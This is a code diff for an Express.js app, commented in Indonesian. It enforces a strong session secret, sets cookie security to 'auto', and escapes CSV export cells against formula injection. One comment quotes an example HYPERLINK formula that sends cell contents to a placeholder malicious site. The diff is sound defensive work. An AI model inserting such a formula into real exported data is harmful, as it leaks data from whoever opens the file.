@@ -80,18 +80,52 @@ app.use(express.static(path.join(__dirname, 'public')));
 // --- SESSION & PASSPORT ------------------------------------------------------
 // PENGAMAN 1: sesi disimpan di SQLite (bukan memori) -> tahan restart & banyak user.
 const createSqliteStore = require('./config/sqlite-session-store');
+
+// --- GUARD KEAMANAN: SESSION_SECRET wajib ada & bukan nilai contoh -----------
+// Cookie sesi ditandatangani memakai kunci ini. Bila kunci diketahui publik
+// (mis. nilai default yang ikut ter-commit ke GitHub), penyerang dapat MEMALSUKAN
+// cookie login berisi id pengguna mana pun — termasuk akun Admin — tanpa password.
+// Karena itu server SENGAJA menolak start daripada diam-diam memakai kunci lemah.
+const _SECRET_TERLARANG = [
+  'rahasia-dev-harap-ganti-di-produksi',
+  'ganti-dengan-string-acak-yang-panjang-dan-unik',
+];
+const SESSION_SECRET = process.env.SESSION_SECRET || '';
+if (!SESSION_SECRET || _SECRET_TERLARANG.includes(SESSION_SECRET) || SESSION_SECRET.length < 16) {
+  console.error('\n============================================================');
+  console.error('[FATAL] SESSION_SECRET belum diisi dengan benar di file .env');
+  console.error('        Kunci ini menandatangani cookie login. Bila kosong,');
+  console.error('        memakai nilai contoh, atau terlalu pendek (<16 karakter),');
+  console.error('        penyerang bisa memalsukan sesi Admin tanpa password.');
+  console.error('');
+  console.error('        SOLUSI: buat kunci acak lalu isikan ke .env, contoh —');
+  console.error('          node -e "console.log(require(\'crypto\').randomBytes(48).toString(\'hex\'))"');
+  console.error('        lalu di .env:  SESSION_SECRET=<hasil perintah di atas>');
+  console.error('============================================================\n');
+  process.exit(1);
+}
+
 app.set('trust proxy', 1); // di belakang tunnel/proxy (Cloudflare) -> cookie Secure benar
 app.use(
   session({
     store: createSqliteStore(db.db),
-    secret: process.env.SESSION_SECRET || 'rahasia-dev-harap-ganti-di-produksi',
+    secret: SESSION_SECRET,
     resave: false,
     saveUninitialized: false,
     cookie: {
       maxAge: 1000 * 60 * 60 * 8,                 // sesi 8 jam
       httpOnly: true,                              // cookie tak bisa dibaca JavaScript (anti-XSS)
       sameSite: 'lax',
-      secure: process.env.COOKIE_SECURE === '1',   // set '1' di .env saat diakses via HTTPS/tunnel
+      // 'auto' = cookie ditandai Secure HANYA bila koneksinya memang HTTPS
+      // (dideteksi dari req.secure / header X-Forwarded-Proto milik tunnel).
+      //
+      // JANGAN kembalikan ke `true` permanen (mis. lewat COOKIE_SECURE=1):
+      // express-session TIDAK mengirim header Set-Cookie sama sekali bila
+      // cookie.secure=true tetapi koneksinya HTTP biasa. Akibatnya login via
+      // http://localhost seolah "berhasil lalu balik ke halaman login" —
+      // password benar dan sesi tercatat, tetapi browser tak pernah menerima
+      // cookienya. Dengan 'auto', lokal (HTTP) dan tunnel (HTTPS) sama-sama jalan.
+      secure: 'auto',
     },
   })
 );
@@ -430,9 +464,19 @@ app.post('/api/resolve/:id', (req, res) => {
 // -----------------------------------------------------------------------------
 // FITUR 2: TEMPLATE & EKSPOR CSV
 // -----------------------------------------------------------------------------
-// Bungkus sel CSV: beri tanda kutip bila mengandung koma / kutip / baris baru
+// Bungkus sel CSV: beri tanda kutip bila mengandung koma / kutip / baris baru.
+//
+// KEAMANAN (CSV/Formula Injection): Excel & Google Sheets memperlakukan sel yang
+// diawali = + - @ (juga TAB/CR) sebagai RUMUS, bukan teks. Karena nama usaha &
+// nama petugas diisi pengguna, nilai seperti
+//   =HYPERLINK("http://situs-jahat/?c="&A1,"klik")
+// akan AKTIF di komputer Admin saat file ekspor dibuka — bisa membocorkan isi sel
+// lain. Solusi baku: sisipkan tanda kutip tunggal di depan sehingga dibaca sebagai
+// teks biasa. Catatan: nomor berformat "+62..." ikut diawali kutip — ini disengaja
+// dan tetap tampil benar sebagai teks di spreadsheet.
 function csvCell(v) {
-  const s = v === null || v === undefined ? '' : String(v);
+  let s = v === null || v === undefined ? '' : String(v);
+  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
   return /[",\n\r]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
 }
 function csvRow(arr) {
